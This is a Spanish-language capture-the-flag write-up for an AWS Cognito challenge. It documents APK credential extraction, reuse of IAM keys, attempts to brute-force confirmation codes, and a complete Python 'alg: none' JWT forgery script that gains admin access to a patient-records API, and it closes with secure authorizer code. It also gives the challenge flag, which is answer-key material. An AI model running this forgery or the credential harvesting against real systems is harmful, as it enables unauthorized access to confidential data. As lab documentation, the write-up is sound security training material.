# Solución: MediCloudX Patient II

**Challenge:** MediCloudX Patient II (500 puntos)
**Objetivo:** Exfiltra información confidencial de los pacientes alojada en patient-insights
**URL:** http://ctf-25-cognito-web-ts0mp822.s3-website-us-east-1.amazonaws.com/

**Flag:** `CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}`

---

## Resumen Ejecutivo

La vulnerabilidad consistió en una **validación incorrecta de tokens JWT** en el Lambda authorizer del API Gateway. El authorizer aceptaba tokens con el algoritmo `none`, permitiendo crear tokens falsos sin firma válida y escalar privilegios a administrador.

---

## Proceso de Resolución

### Fase 1: Reconocimiento Inicial

#### 1.1 Análisis del Portal Web

```bash
curl -s http://ctf-25-cognito-web-ts0mp822.s3-website-us-east-1.amazonaws.com/ > portal.html
```

**Información extraída:**
- **User Pool ID:** `us-east-1_frZ3u7zmn`
- **Client ID:** `clt9hlac04nl1nqh3godubqg`
- **Identity Pool ID:** `us-east-1:4343baa8-ec9b-4f5c-a56c-7003fdc6baca`
- **API Endpoint:** `https://sd94qvbn6g.execute-api.us-east-1.amazonaws.com/prod/patients`

**Hallazgos clave del código JavaScript:**
```javascript
// Línea 403 del portal
role: result.UserAttributes.find(attr => attr.Name === 'custom:role')?.Value || 'reader'

// Línea 426-432: Validación de rol en el cliente
if (user.role === 'admin') {
    document.getElementById('admin-content').classList.remove('hidden');
}
```

**Conclusión:** Se requiere el atributo `custom:role = 'admin'` para acceder a los registros de pacientes.

---

### Fase 2: Exploración de AWS con Credenciales Previas

Utilicé las credenciales IAM obtenidas del reto anterior (MediCloudX Data Analytics I):

```python
# daniel.lopez credentials
AWS_ACCESS_KEY = 'AKIA5HCACCPUMNRPJAMJ'
AWS_SECRET_KEY = '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'
```

#### 2.1 Búsqueda en S3 Buckets

```bash
python3 patient_ii_exploit.py
```

**Resultado:** Encontré el bucket `ctf-25-website-0a466b7c` con un APK Android.

#### 2.2 Análisis del APK

```bash
# Descargar el APK
aws s3 cp s3://ctf-25-website-0a466b7c/app-debug.apk /tmp/

# Extraer contenido
unzip /tmp/app-debug.apk -d /tmp/app_extracted/

# Buscar credenciales en archivos DEX
strings /tmp/app_extracted/classes.dex | grep -E "@medicloudx\.com|password"
```

**Credenciales encontradas:**
- `admin@medicloudx.com`
- `dr.martinez@medicloudx.com`
- `dr.rodriguez@medicloudx.com`
- Contraseñas: `Admin2024!`, `MediCloud2024!`

---

### Fase 3: Intentos de Autenticación con Cognito

#### 3.1 Autenticación con credenciales del APK

```python
cognito.initiate_auth(
    ClientId=CLIENT_ID,
    AuthFlow='USER_PASSWORD_AUTH',
    AuthParameters={
        'USERNAME': 'dr.martinez@medicloudx.com',
        'PASSWORD': 'MediCloud2024!'
    }
)
```

**Error:** `UserNotConfirmedException - User is not confirmed`

#### 3.2 Intentos de Confirmación Administrativa

**Probado con IAM credentials:**
```python
cognito.admin_confirm_sign_up(
    UserPoolId=USER_POOL_ID,
    Username='dr.martinez@medicloudx.com'
)
```

**Error:** `AccessDeniedException` - Las credenciales IAM no tienen permisos `cognito-idp:AdminConfirmSignUp`

#### 3.3 Auto-registro con atributos de admin

```python
cognito.sign_up(
    ClientId=CLIENT_ID,
    Username='hacker.admin@medicloudx.com',
    Password='TestHacker2024!',
    UserAttributes=[
        {'Name': 'email', 'Value': 'hacker.admin@medicloudx.com'},
        {'Name': 'custom:role', 'Value': 'admin'}  # ✓ Permitido
    ]
)
```

**Resultado:** El registro funcionó, pero el usuario requiere confirmación vía email.

**Conclusión:** Todas las vías de autenticación legítima están bloqueadas.

---

### Fase 4: Exploración de Vectores Alternativos

#### 4.1 Intentos con Lambda Functions

```python
# Intentar invocar funciones Lambda directamente
lambda_client.invoke(FunctionName='GetPatients')
```

**Resultado:** `AccessDeniedException` - Sin permisos para invocar Lambda

#### 4.2 Pruebas de API sin autenticación

```bash
curl https://sd94qvbn6g.execute-api.us-east-1.amazonaws.com/prod/patients
```

**Respuesta:** `401 Unauthorized` - La API requiere autenticación

#### 4.3 Intentos con Identity Pool

```python
cognito_identity.get_id(IdentityPoolId=IDENTITY_POOL_ID)
```

**Error:** `Unauthenticated access is not supported for this identity pool`

---

### Fase 5: Descubrimiento de la Vulnerabilidad JWT

#### 5.1 Análisis de la Autenticación JWT

Al revisar el código del portal, noté que:
1. El frontend solo verifica el atributo `custom:role` en el token
2. No hay validación adicional en el cliente
3. El API usa `Authorization: Bearer {idToken}`

**Hipótesis:** ¿El Lambda authorizer valida correctamente la firma del JWT?

#### 5.2 Creación de Token Falso (Algorithm None Attack)

```python
import base64
import json
import time

# Header con algoritmo "none"
fake_header = {
    "alg": "none",  # ← Algoritmo sin firma
    "typ": "JWT"
}

# Payload con claims de administrador
fake_payload = {
    "sub": "fake-user-id",
    "aud": CLIENT_ID,
    "email": "admin@medicloudx.com",
    "custom:role": "admin",  # ← Rol de administrador
    "cognito:groups": ["admin"],
    "token_use": "id",
    "auth_time": int(time.time()),
    "iss": f"https://cognito-idp.us-east-1.amazonaws.com/{USER_POOL_ID}",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time())
}

# Codificar en Base64URL (sin padding)
header_b64 = base64.urlsafe_b64encode(
    json.dumps(fake_header).encode()
).decode().rstrip('=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(fake_payload).encode()
).decode().rstrip('=')

# Crear token sin firma (termina en punto)
fake_token = f"{header_b64}.{payload_b64}."
```

#### 5.3 Explotación de la Vulnerabilidad

```python
import requests

response = requests.get(
    'https://sd94qvbn6g.execute-api.us-east-1.amazonaws.com/prod/patients',
    headers={'Authorization': f'Bearer {fake_token}'}
)

print(f"Status: {response.status_code}")
print(response.json())
```

**Resultado:** ✅ **Status 200 - Acceso concedido**

---

### Fase 6: Extracción de la Flag

**Respuesta del API:**

```json
{
  "success": true,
  "data": [
    {
      "patient_id": "ADMIN_SYS_007",
      "name": "System Administrator",
      "department": "administration",
      "diagnosis": "System Maintenance",
      "status": "active",
      "access_level": "admin_only",
      "notes": "CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}",
      "created_at": "2025-01-21T08:00:00Z"
    },
    // ... otros 9 registros de pacientes
  ],
  "count": 10,
  "message": "Retrieved patient records for MediCloudX Health System"
}
```

**Flag encontrada:** `CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}`

---

## Análisis Técnico de la Vulnerabilidad

### ¿Qué es el Algorithm None Attack?

El **Algorithm None Attack** es una vulnerabilidad común en implementaciones JWT donde:

1. El token JWT especifica `"alg": "none"` en su header
2. No incluye firma (termina con un punto: `header.payload.`)
3. El servidor acepta el token sin validar que esté firmado

### Configuración Vulnerable del Lambda Authorizer

```javascript
// Código vulnerable (hipotético)
exports.handler = async (event) => {
    const token = event.authorizationToken.replace('Bearer ', '');

    // ❌ VULNERABLE: Decodifica sin validar firma
    const payload = JSON.parse(
        Buffer.from(token.split('.')[1], 'base64').toString()
    );

    // Solo verifica que tenga el claim correcto
    if (payload['custom:role'] === 'admin') {
        return generatePolicy('user', 'Allow', event.methodArn);
    }
};
```

### Código Seguro (Corrección)

```javascript
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');

// Configurar cliente JWKS para obtener claves públicas de Cognito
const client = jwksClient({
    jwksUri: `https://cognito-idp.us-east-1.amazonaws.com/${userPoolId}/.well-known/jwks.json`
});

const getKey = (header, callback) => {
    client.getSigningKey(header.kid, (err, key) => {
        const signingKey = key.publicKey || key.rsaPublicKey;
        callback(null, signingKey);
    });
};

exports.handler = async (event) => {
    const token = event.authorizationToken.replace('Bearer ', '');

    // ✅ SEGURO: Verificar firma y claims
    return new Promise((resolve, reject) => {
        jwt.verify(token, getKey, {
            issuer: `https://cognito-idp.us-east-1.amazonaws.com/${userPoolId}`,
            algorithms: ['RS256'] // ← Forzar solo RS256
        }, (err, decoded) => {
            if (err) return reject('Unauthorized');

            if (decoded['custom:role'] === 'admin') {
                resolve(generatePolicy('user', 'Allow', event.methodArn));
            } else {
                reject('Forbidden');
            }
        });
    });
};
```

---

## Caminos Intentados (Sin Éxito)

### ❌ 1. Confirmar usuario con IAM credentials
- **Problema:** Las credenciales IAM no tenían permisos `cognito-idp:AdminConfirmSignUp`

### ❌ 2. Acceso no autenticado al Identity Pool
- **Problema:** El Identity Pool no permitía acceso no autenticado

### ❌ 3. Invocar Lambda functions directamente
- **Problema:** Sin permisos `lambda:InvokeFunction`

### ❌ 4. Códigos de confirmación predecibles
- **Probado:** `123456`, `000000`, `111111`, etc.
- **Problema:** Ningún código común funcionó

### ❌ 5. Acceso directo a S3 buckets de Cognito
- **Buckets probados:** `ctf-25-cognito-flag-ts0mp822`, `ctf-25-cognito-web-ts0mp822`
- **Problema:** `AccessDenied` con credenciales IAM

---

## Herramientas y Scripts Desarrollados

### Scripts Principales

1. **`explore_api_gateway.py`** - Exploración de API Gateway y Lambda
2. **`cognito_authenticate.py`** - Intentos de autenticación con credenciales del APK
3. **`confirm_user.py`** - Intentos de confirmación administrativa
4. **`try_confirmation_codes.py`** - Fuerza bruta de códigos de confirmación
5. **`test_jwt_manipulation.py`** - Explotación de vulnerabilidad JWT ✅

### Script de Explotación Final

```python
#!/usr/bin/env python3
import requests
import json
import base64
import time

API_ENDPOINT = 'https://sd94qvbn6g.execute-api.us-east-1.amazonaws.com/prod/patients'
USER_POOL_ID = 'us-east-1_frZ3u7zmn'
CLIENT_ID = 'clt9hlac04nl1nqh3godubqg'

# Crear token JWT falso con alg=none
fake_header = {"alg": "none", "typ": "JWT"}
fake_payload = {
    "sub": "fake-user-id",
    "aud": CLIENT_ID,
    "email": "admin@medicloudx.com",
    "custom:role": "admin",
    "cognito:groups": ["admin"],
    "token_use": "id",
    "auth_time": int(time.time()),
    "iss": f"https://cognito-idp.us-east-1.amazonaws.com/{USER_POOL_ID}",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time())
}

header_b64 = base64.urlsafe_b64encode(json.dumps(fake_header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(fake_payload).encode()).decode().rstrip('=')

fake_token = f"{header_b64}.{payload_b64}."

# Explotar la vulnerabilidad
response = requests.get(
    API_ENDPOINT,
    headers={'Authorization': f'Bearer {fake_token}'}
)

if response.status_code == 200:
    data = response.json()
    print(json.dumps(data, indent=2))

    # Buscar la flag
    for record in data['data']:
        if 'CTF{' in str(record):
            print(f"\n🚩 FLAG: {record['notes']}")
```

---

## Lecciones Aprendidas

### Seguridad en JWT

1. **Nunca aceptar algoritmo "none":** Siempre validar que el token use un algoritmo criptográfico fuerte (RS256, HS256)
2. **Verificar firma:** Usar bibliotecas que validen la firma contra las claves públicas de Cognito
3. **Validar issuer y audience:** Verificar que el token provenga del User Pool correcto
4. **Verificar expiración:** Validar los claims `exp` e `iat`

### AWS Cognito Best Practices

1. **Lambda Authorizers:** Siempre usar bibliotecas como `jsonwebtoken` con verificación de firma
2. **Configurar algoritmos permitidos:** Explícitamente especificar solo algoritmos seguros
3. **Principio de mínimo privilegio:** Las credenciales IAM deben tener solo los permisos necesarios
4. **Auditoria:** Habilitar CloudTrail para registrar todas las operaciones de autenticación

### Metodología de Pentesting

1. **Reconocimiento exhaustivo:** Extraer toda la información posible antes de intentar exploits
2. **Enumerar todos los servicios:** S3, Lambda, Cognito, API Gateway, DynamoDB, etc.
3. **Probar configuraciones comunes:** Códigos predecibles, tokens sin firma, etc.
4. **Documentar todos los intentos:** Llevar registro de qué funcionó y qué no

---

## Timeline del Ataque

```
[00:00] Análisis del portal web y extracción de configuración de Cognito
[00:15] Descarga y análisis del APK, extracción de credenciales
[00:30] Intentos de autenticación con credenciales del APK (fallidos)
[00:45] Intentos de confirmación administrativa con IAM (sin permisos)
[01:00] Exploración de servicios AWS alternativos (todos bloqueados)
[01:15] Auto-registro con custom:role=admin (requiere confirmación)
[01:30] Pruebas de códigos de confirmación comunes (sin éxito)
[01:45] Análisis del código JavaScript del portal
[02:00] Hipótesis: Vulnerabilidad en validación JWT
[02:15] Creación de token falso con alg=none
[02:20] ✅ ÉXITO - API acepta token sin firma
[02:25] 🚩 FLAG CAPTURADA
```

---

## Conclusión

Este desafío demostró una vulnerabilidad crítica común en aplicaciones web modernas: **la validación incorrecta de tokens JWT**. Aunque el sistema implementaba múltiples capas de seguridad (Cognito User Pools, confirmación de email, roles de usuario), una sola falla en el Lambda authorizer permitió un bypass completo de la autenticación.

La clave del éxito fue:
1. Reconocimiento exhaustivo de la infraestructura AWS
2. Análisis del código JavaScript del cliente
3. Comprensión de cómo funciona la autenticación JWT
4. Conocimiento de vulnerabilidades comunes (algorithm none attack)

**Flag:** `CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}`
